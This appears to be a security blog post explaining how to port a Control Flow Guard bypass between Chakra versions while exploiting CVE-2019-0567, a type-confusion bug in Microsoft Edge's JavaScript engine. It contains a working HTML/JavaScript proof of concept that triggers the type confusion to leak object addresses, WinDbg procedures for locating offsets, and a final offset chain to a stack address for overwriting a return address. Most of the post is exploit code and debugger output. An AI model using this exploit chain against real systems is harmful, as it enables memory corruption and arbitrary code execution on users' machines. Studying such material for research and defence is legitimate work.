---
layout: post
title: Porting the leafInterpreterFrame CFG Bypass
subtitle: How to port a CFG Bypass between versions of Chakra.
cover-img: https://i.ytimg.com/vi/P_ri2uy9Hgs/maxresdefault.jpg
thumbnail-img: https://upload.wikimedia.org/wikipedia/commons/thumb/0/01/Sapta_Chakra%2C_1899_%28cropped%29.jpg/1024px-Sapta_Chakra%2C_1899_%28cropped%29.jpg
share-img: https://upload.wikimedia.org/wikipedia/commons/thumb/0/01/Sapta_Chakra%2C_1899_%28cropped%29.jpg/1024px-Sapta_Chakra%2C_1899_%28cropped%29.jpg
tags: [Chakra, CFG, Bypass]
excerpt: This post explains how to port a CFG Bypass between different versions of Chakra, specifically focusing on the leafInterpreterFrame.
---

## Introduction

I was attempting to bypass CFG while exploiting CVE-2019-0567. The bug is a type confusion which leads to arbitrary reading and writing of memory. To bypass CFG, we can leak an address from the stack using the following technique, [originally documented by ProjectZero](https://project-zero.issues.chromium.org/issues/42450395):

```
(RecyclableObject *)Var->type->javascriptLibrary->scriptContext->threadContext->leafInterpreterFrame
```

The offsets in the post, and most I could [find on the internet](https://www.richardosgood.com/posts/chakra-type-confusion/) are:
```
Type:                       +0x08
javaScriptLibrary:          +0x08
scriptContext:              +0x430
threadContext:              +0x5c0
leafInterpreterFrame        +0x8f8
```

But these were not valid for my version of Chakra.

## Getting the type object

To begin the porting, we need a simple PoC which writes the leaked address of the `Type` object.

```html
<html>

<body>
    <script>

        obj = {}
        obj.a = 1;
        obj.b = 2;
        obj.c = 3;
        obj.d = 4;
        obj.e = 5;
        obj.f = 6;
        obj.g = 7;
        obj.h = 8;
        obj.i = 9;
        obj.j = 10;

        dv1 = new DataView(new ArrayBuffer(0x100));
        dv2 = new DataView(new ArrayBuffer(0x100000));


        function opt(o, proto, value) {
            o.b = 1;

            let tmp = { __proto__: proto };

            o.a = value;
        }

        function exploit() {
            for (let i = 0; i < 2000; i++) {
                let o = { a: 1, b: 2 };
                opt(o, {}, {});
            }

            let o = { a: 1, b: 2 };

            opt(o, o, obj);
            o.c = dv1;
            obj.h = dv2;

            type_lo = dv1.getUint32(0x8, true);
            type_hi = dv1.getUint32(0xc, true);
            console.log("Type Address: 0x" + type_hi.toString(16) + type_lo.toString(16));

            Math.sin(0x1337);

        }

    </script>
    <div class="buttonbar">
        <input type="button" onclick="exploit()" value="Go" />
</body>

</html>
```

Open the file, attach to the MicrosoftEdgeCP.exe process with the largest Private Bytes, and set `bu chakra!Js::Math::Sin`.

Execute the PoC and watch the type address get printed to the console. 
![Type Address](/assets/img/type_address.png)

It will break into windbg.

![Initial WinDbg Breal](/assets/img/0type.png)

```
0:015> dqs 0x260ab640040 L4
00000260`ab640040  00000000`00000038
00000260`ab640048  00000260`ab5f3a00         <--- Pointer to the JavascriptLibrary Object
00000260`ab640050  00000260`ab614ee0
00000260`ab640058  00007ffb`181fa5b0 chakra!Js::RecyclableObject::DefaultEntryPoint
```

The JavascriptLibrary Pointer can be seen using either of the following commands. The `poi` may help you visualize how we are doing the pointer arithmetic from the initial pointer.

![alt text](/assets/img/1jslib.png)

We now need to find the offset from the JavascriptLibrary pointer to the ScriptContext pointer. We know from the other blogs that it is around +0x430. The following command will help us find it:

```
.for (r @$t0 = 0; @$t0 < 150; r @$t0 = @$t0 + 1) { .printf "Index: %d\n", @$t0; dqs poi(00000260`ab5f3a00 + @$t0 * 0x8) L1 }
```

The command loops through each pointer, dereferences it, and prints the symbol for the value - if there is one. 

![alt text](/assets/img/2forloop.png)

By searching for ScriptContext, we can see the offset at which the symbol appears:
![alt text](/assets/img/3scriptcontext.png)

We can then run `? 0n136 * 0x8` to reveal the updated offset to get from JavascriptLibrary to ScriptContext: `+0x440`

Now repeat the process for ThreadContext. It is roughly +0x5c0 so 200 pointers should do.

```
.for (r @$t0 = 0; @$t0 < 150; r @$t0 = @$t0 + 1) { .printf "Index: %d\n", @$t0; dqs poi(00000261`ac36c110+ @$t0 * 0x8) L1 }
```

![alt text](/assets/img/4threadcontext.png)

The ThreadContext Ptr is at offset `+0x370`. 

One final time for the stack address. This time we can look for addresses that fall within the range of the thread's stack. First run !teb to find the range:


![alt text](/assets/img/5teb.png)


```
dqs 00000260`9702fc60 L300
```

Then use Ctrl+F to search all the pointers for the start of the stack address: ``00000073`5d``. Be sure to add the backtick to match the output of dqs!

![alt text](/assets/img/6stackptr.png)

Finally, calculate the offset
```
0:015> ? 00000260`970301a0 - 00000260`9702fc60 
Evaluate expression: 1344 = 00000000`00000540
```

# Conclusion
The offsets from this blog are as follows:

```
type+0x8            = javascriptlib
javascriptlib+0x440 = scriptcontext
scriptcontext+0x370 = threadcontext
threadcontext+x540  = stackaddress
```

You can then use the stack address to search for a return address and overwrite to take control and bypass CFG.
